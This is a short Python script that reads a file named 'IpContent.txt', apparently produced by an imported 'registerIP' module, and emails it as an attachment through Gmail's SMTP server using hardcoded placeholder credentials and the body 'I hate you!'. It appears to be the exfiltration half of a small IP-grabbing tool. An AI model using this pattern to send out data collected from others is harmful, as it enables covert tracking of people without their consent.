from registerIP import *
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

subject = "Content"
body = """Hello there :)

I hate you!"""
sender_email = "obv_not_my_emaik@gmail.com"
receiver_email = "obv_not_my_emaik@gmail.com"
password = "obv_not_my_password"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email

# Add body to email
message.attach(MIMEText(body, "plain"))

filename = "IpContent.txt"

# While main doesn't exist, code must exit
try:
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
except FileNotFoundError as error:
    print(error)
    exit()

# Encode file in ASCII characters to send by email
encoders.encode_base64(part)

# Add header as key/value pair to attachment part

part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in Server
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)
